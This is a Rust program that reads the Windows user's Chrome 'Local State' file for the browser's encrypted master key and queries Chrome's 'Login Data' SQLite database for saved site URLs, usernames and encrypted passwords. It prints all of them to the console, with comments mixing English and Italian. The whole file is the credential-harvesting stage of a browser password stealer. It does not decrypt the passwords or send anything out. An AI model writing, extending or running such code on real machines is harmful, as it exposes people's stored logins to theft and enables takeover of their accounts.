use std::path::PathBuf;
use std::{                                  // imports from the standard library these modules:
    env,                                    // used to access command line arguments
    error::Error,                           // used to handle errors
    fs::File,                               // used to open files
    io::{BufRead, BufReader},               // used to read files  
}; 
use regex::Regex;                           // used to find the encrypted_key inside the local file
use rusqlite::{params, Connection, Result}; // used to extract encrypted password, username, URL
use rusqlite::types::Value;

extern crate hex;
use hex::FromHex;

fn get_chrome_local_pass_path() -> PathBuf{
    let userprofile = env::var("USERPROFILE").unwrap_or_else(|_| String::from("."));                                        // Get the USERPROFILE environment variable
    let local_pass_path = PathBuf::from(format!(r"{}\AppData\Local\Google\Chrome\User Data\Local State", userprofile));     // Construct the path
    return local_pass_path;
}

fn extract_encrypted_key(local_pass_path_file: File) -> Result<String, String> {
    let reader = BufReader::new(&local_pass_path_file);                            // create a buffer reader to read the file
    for line in reader.lines() {                                                   // iterate over each line in the file       
        let line = match line {
            Ok(line) => line,
            Err(err) => return Err(err.to_string()),                               // return error if there's an IO error
        };
        let re = match Regex::new(r#""encrypted_key":"([^"]+)""#) {                // Regex pattern for finding subustring after "encrypted_key"
            Ok(re) => re,
            Err(err) => return Err(err.to_string()),                               // return error if there's an error creating the regex
        };
        if let Some(captures) = re.captures(&line) {                               // find string where there is the Regex
            if let Some(encrypted_key) = captures.get(1) {
                return Ok(encrypted_key.as_str().to_string());                     // return the substring
            }
        } else {
            println!("Substring didn't find");                                     // print if substring is not found
        }
    }
    Err("Substring not found".to_string())                                         // return an error if substring is not found
}

fn extract_login_data() -> Result<Vec<(String, String, rusqlite::types::Value)>> {
    let userprofile = env::var("USERPROFILE").unwrap_or_else(|_| String::from(".")); 
    let db_path = PathBuf::from(format!(r"{}\AppData\Local\Google\Chrome\User Data\Default\Login Data ", userprofile));      // extract db path

    let conn = Connection::open(db_path)?;          
    // Query execution
    let mut select = conn.prepare("SELECT action_url, username_value, password_value FROM logins")?;

    let mut rows = select.query(params![])?;

    // Vector to memorize data
    let mut login_data = Vec::new();

    while let Some(row) = rows.next()? {
        let action_url: String = row.get(0)?;
        let username_value: String = row.get(1)?;
        let password_value: rusqlite::types::Value  = row.get(2)?;
        login_data.push((action_url, username_value, password_value));    
    }

    Ok(login_data)
}


fn binary_to_hex_string(binary_data: &[u8]) -> String {
    binary_data.iter().map(|byte| format!("{:02X}", byte)).collect::<String>()
}


fn convert_value_to_hex(password_value: rusqlite::types::Value) -> String {
    let password_string = match password_value {
        Value::Blob(blob) => binary_to_hex_string(&blob),
        Value::Text(text) => binary_to_hex_string(text.as_bytes()),             // Converti la stringa in un array di byte
        _ => return "Invalid value type".to_string(),                           // Gestisci altri tipi di Value, se necessario
    };

    // Converti la stringa esadecimale in un array di byte
    let bytes = hex::decode(password_string).unwrap();

    // Converti l'array di byte in una stringa con il formato \x
    let mut formatted_string = String::new();
    for byte in bytes {
        formatted_string.push_str(&format!("\\x{:02X}", byte));
    }

    return formatted_string;
}


fn main() -> Result<(), Box<dyn Error>> {
    let local_pass_path = get_chrome_local_pass_path();
    println!("\n\nPath: {:?}", local_pass_path);

    let local_pass_path_file = File::open(get_chrome_local_pass_path())?;               // open file from command line arguments            
    let encrypted_key = extract_encrypted_key(local_pass_path_file)
        .unwrap_or_default();  // Use an empty string if there is an error
    println!("Encrypted key: {} \n", encrypted_key);                                       // extract_encrypted_key() returns a Result => can't simply print the result (need to handle err)

    let login_data = extract_login_data()?;
    for (action_url, username_value, password_value) in &login_data {
        if action_url != ""{
            println!("Action URL: {}", action_url);
            println!("Username Value: {}", username_value);
            println!("Password Value: {}", convert_value_to_hex(password_value.clone()));
            let password_string = convert_value_to_hex(password_value.clone());
            
            // Rimuovi il prefisso \\x e dividilo in sottostringhe
            let hex_values: Vec<&str> = password_string[2..].split("\\x").collect();

            // Converti le sottostringhe esadecimali in vettori di byte
            let bytes: Vec<u8> = hex_values.iter().filter_map(|s| {
                match <[u8; 1]>::from_hex(s) {
                    Ok(v) => Some(v[0]),
                    Err(_) => None,
                }
            }).collect();

            // Stampa il vettore di byte come byte literal
            println!("{:?}", bytes);
            println!("-----------------------");
        }
        
    }

    Ok(())
}
